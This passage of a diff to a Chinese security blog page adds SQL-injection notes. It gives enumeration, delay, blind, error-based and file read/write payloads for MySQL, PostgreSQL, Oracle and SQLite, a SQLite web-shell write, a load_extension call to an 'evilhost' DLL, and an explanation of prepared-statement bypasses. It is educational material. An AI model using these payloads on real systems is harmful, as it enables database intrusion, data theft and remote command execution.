+<li><code>0x9</code>  <code>0xa-0xd</code>  <code>0x20</code>  <code>0xa0</code></li>
+</ul>
+</li>
+<li><strong>Current User</strong><ul>
+<li><code>SELECT user()</code></li>
+<li><code>SELECT system_user()</code></li>
+</ul>
+</li>
+<li><strong>List User</strong><ul>
+<li><code>SELECT user FROM mysql.user</code></li>
+</ul>
+</li>
+<li><strong>Current Database</strong><ul>
+<li><code>SELECT database()</code></li>
+</ul>
+</li>
+<li><strong>List Database</strong><ul>
+<li><code>SELECT schema_name FROM information_schema.schemata</code></li>
+</ul>
+</li>
+<li><strong>List Tables</strong><ul>
+<li><code>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != &#39;mysql&#39; AND table_schema != &#39;information_schema&#39;</code></li>
+</ul>
+</li>
+<li><strong>List Columns</strong><ul>
+<li><code>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != &#39;mysql&#39; AND table_schema != &#39;information_schema&#39;</code></li>
+</ul>
+</li>
+<li><strong>If</strong><br>  *<code>SELECT if(1=1,&#39;foo&#39;,&#39;bar&#39;);</code> return ‘foo’</li>
+<li><strong>Ascii</strong><ul>
+<li><code>SELECT char(0x41)</code></li>
+<li><code>SELECT ascii(&#39;A&#39;)</code></li>
+<li><code>SELECT 0x414243</code> =&gt; <code>return ABC</code></li>
+</ul>
+</li>
+<li><strong>Delay</strong><ul>
+<li><code>sleep(1)</code></li>
+<li><code>SELECT BENCHMARK(1000000,MD5(&#39;A&#39;))</code></li>
+</ul>
+</li>
+<li><strong>Read File</strong><ul>
+<li><code>select @@datadir</code></li>
+<li><code>select load_file(&#39;databasename/tablename.MYD&#39;)</code></li>
+</ul>
+</li>
+<li><strong>Blind</strong><ul>
+<li><code>ascii(substring(str,pos,length)) &amp; 32 = 1</code></li>
+</ul>
+</li>
+<li><strong>Error Based</strong><ul>
+<li><code>select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;</code></li>
+</ul>
+</li>
+<li><strong>Write File</strong><ul>
+<li><code>union select 1,1,1 into outfile &#39;/tmp/demo.txt&#39;</code></li>
+<li><code>union select 1,1,1 into dumpfile &#39;/tmp/demo.txt&#39;</code></li>
+<li>dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏</li>
+</ul>
+</li>
+<li><strong>Change Password</strong><ul>
+<li><code>mysql -uroot -e &quot;use mysql;UPDATE user SET password=PASSWORD(&#39;newpassword&#39;) WHERE user=&#39;root&#39;;FLUSH PRIVILEGES;&quot;</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="7-3-PostgresSQL-Payload"><a href="#7-3-PostgresSQL-Payload" class="headerlink" title="7.3 PostgresSQL Payload"></a>7.3 PostgresSQL Payload</h5><ul>
+<li>Version<ul>
+<li><code>SELECT version()</code></li>
+</ul>
+</li>
+<li>Comment<ul>
+<li><code>SELECT 1 -- comment</code></li>
+<li><code>SELECT /*comment*/1</code></li>
+</ul>
+</li>
+<li>Current User<ul>
+<li><code>SELECT user</code></li>
+<li><code>SELECT current_user</code></li>
+<li><code>SELECT session_user</code></li>
+<li><code>SELECT getpgusername()</code></li>
+</ul>
+</li>
+<li>List User<ul>
+<li><code>SELECT usename FROM pg_user</code></li>
+</ul>
+</li>
+<li>Current Database<ul>
+<li><code>SELECT current_database()</code></li>
+</ul>
+</li>
+<li>List Database<ul>
+<li><code>SELECT datname FROM pg_database</code></li>
+</ul>
+</li>
+<li>Ascii<ul>
+<li><code>SELECT char(0x41)</code></li>
+<li><code>SELECT ascii(&#39;A&#39;)</code></li>
+</ul>
+</li>
+<li>Delay<ul>
+<li><code>pg_sleep(1)</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="7-4-Oracle-Payload"><a href="#7-4-Oracle-Payload" class="headerlink" title="7.4 Oracle Payload"></a>7.4 Oracle Payload</h5><ul>
+<li>dump<ul>
+<li><code>SELECT * FROM ALL_TABLES</code></li>
+</ul>
+</li>
+<li>Comment<ul>
+<li><code>--</code></li>
+<li><code>/**/</code></li>
+</ul>
+</li>
+<li>Space<ul>
+<li><code>0x00</code>  <code>0x09</code>  <code>0xa-0xd</code>  <code>0x20</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="7-5-SQLite3-Payload"><a href="#7-5-SQLite3-Payload" class="headerlink" title="7.5 SQLite3 Payload"></a>7.5 SQLite3 Payload</h5><ul>
+<li><strong>Comment</strong><ul>
+<li><code>--</code></li>
+<li><code>/**/</code></li>
+</ul>
+</li>
+<li><strong>Version</strong><ul>
+<li><code>select sqlite_version();</code></li>
+</ul>
+</li>
+<li><strong>Command Execution</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &apos;/var/www/lol.php&apos; AS lol;</span><br><span class="line">CREATE TABLE lol.pwn (dataz text);</span><br><span class="line">INSERT INTO lol.pwn (dataz) VALUES (&apos;&lt;?system($_GET[&apos;cmd&apos;]); ?&gt;&apos;);--</span><br></pre></td></tr></table></figure>
+<p><strong>* Load_extension</strong></p>
+<pre><code>* `UNION SELECT 1,load_extension(&apos;\\evilhost\evil.dll&apos;,&apos;E&apos;);--`
+</code></pre><h4 id="0×08-预编译"><a href="#0×08-预编译" class="headerlink" title="0×08 预编译"></a>0×08 预编译</h4><h5 id="8-1-简介"><a href="#8-1-简介" class="headerlink" title="8.1 简介"></a>8.1 简介</h5><p>SQL注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的SQL引擎进行解析为AST或Opcode，第二次交互发送数据，代入AST或Opcode中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。</p>
+<h5 id="8-2-模拟预编译"><a href="#8-2-模拟预编译" class="headerlink" title="8.2 模拟预编译"></a>8.2 模拟预编译</h5><p>为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。</p>
+<h5 id="8-3-绕过"><a href="#8-3-绕过" class="headerlink" title="8.3 绕过"></a>8.3 绕过</h5><p><strong>预编译使用错误</strong><br>预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。</p>
+<p><strong>部分参数不可预编译</strong><br> 在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。</p>
+<p><strong>预编译实现错误</strong><br>部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。</p>
 
       
 
@@ -277,11 +668,11 @@ var _hmt = _hmt || [];
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">开发</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">漏洞</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">知识</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">笔记</a>
         		</li>
       		
 		</ul>
@@ -337,7 +728,7 @@ var _hmt = _hmt || [];
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACI0lEQVR42u3ay27DMAxE0fz/TytAVwUCyzNDJYDJq5XhpLGOF6z4eL3ktf5W5f76t67uX33n2IIBA8ZjGWu7Prd1db3/TXcP+t5gwIAxh7EPmi5jH2pPvSYYMGDA2Ac+5b6yLZ0HAwYMGFnArR8W9VcAAwYMGEoSuy+ZVYp3P83FYcCA8UCG++BfXn+xvwEDBoyHMFa09CJapfFg7AcGDBitGfvHVwYvlEPk/rl66Q0GDBjTGAcCn5m4ZiMaNwEXBgwYjRjKYS4LlNnm3H8DMGDAmMNw00j38foB0T0mwoABYwJD/1F9wKJS+s8aqDBgwJjDcA+I7t9mxTvjUxgwYDRlKC1J91pPd/WRjptnwYABYwwjG6GopKmnBjVgwIAxjaGHQoWnF/LcVsFNwIUBA0YjhtuS1LeeDV64RT0YMGBMYNRbiWcbANl3YMCA0ZuRpa+VEr+erLojHTBgwOjKWMLKGgBZWU0/RErvCQYMGC0YLsYtw1XaA/qCAQPGHEYY5sy4pzdB9aMnDBgwpjH0EJk1L/Vt6Y0KGDBgTGBknU+9ZOa+pgMLBgwYjRhhuhgFWTdwGyU/GDBgtGZUArE+2uWmrO7oBgwYMCYw3BZm1ozURyvcIyYMGDDmMLIQWR+byFoOh+tzMGDAGMZQ7uuDZUrohwEDBgylMZCNpWafSnk2DBgwmjKy8dNv9BPDJBkGDBitGVljICvlZ7zsRcCAAaMF4w2/tbwqK7Z1BwAAAABJRU5ErkJggg==" alt="微信分享二维码">
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACKklEQVR42u3aYW7DMAgG0N7/0t0B1qQf2JsU/PJrUtPUz5MIYF6v+HpfXMk9v+9PnvD6iwsDA+OxjN4PX32a31P93ftNxMDAOIFxFcGu7rlfdPKte3C+NgwMDIxe6Kwy8q3BwMDAqAbcanWZLAgDAwNjpYitLi75NCmVN9fiGBgYD2TkQfP///6T8w0MDIxHMXrN+pX0LllieVUYGBijGb1HVwP0ShAvrAcDA2MooxpM14cq8iOH++378H/AwMAYyshDZH7o2Avc24pbDAyMcYw8tOWPrgblvBh+Vd8JGBgYIxgrBeT9ovODz94TMDAwzmHkwxB5CpgUpc0CtZrVYmBgjGDkKWCS/PVytrydF60QAwNjHGO9cd9rmVXvLM+MYGBgDGVUU8bkzr0F8JdpEQwMjNGMXpcuPx7Ik8t8Uz4EXAwMjKGMKiBf3Ap42+AFBgbGCEbvy3nZmffw89HVL+8NDAyM0YxdsWvlmKG6cdG7AgMD4+GM3lKSNtlKmpiMXERnsBgYGKMZvRbbrnmtZrcfAwPjGEa16dZr0vWGz76UxxgYGAczqq3/3hb0wjcGBsYJjHfxqrb4qwOyTSoGBsZoxq4StJfeVUvlDSQMDIzHMqohsnfQmO9fL0xjYGCcwKgGvhyfh+Nq+fqhlMXAwMBolb69AYu8hYeBgYGRJ3bV4nNXOw8DA+McRp7kVQvU6ihYlYSBgXECY6V07LXVkm2qjpdhYGAMZfwAP1csumkhgksAAAAASUVORK5CYII=" alt="微信分享二维码">
     </div>
 </div>
 
@@ -351,18 +742,9 @@ var _hmt = _hmt || [];
   
 <nav id="article-nav">
   
-    <a href="/2019/12/18/docker使用手册/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          docker使用手册
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/12/10/浅谈敏捷开发流程/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">浅谈敏捷开发流程</div>
+    <a href="/2020/06/12/网络空间探测工具调研/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">网络空间探测工具调研</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -392,7 +774,7 @@ var _hmt = _hmt || [];
   
 
   
-  <div id="SOHUCS" sid="什么是高并发" ></div> 
+  <div id="SOHUCS" sid="漏洞攻防系列-SQL注入" ></div> 
 <script type="text/javascript"> 
 (function(){ 
 var appid = "cyuoyyRfG"; 
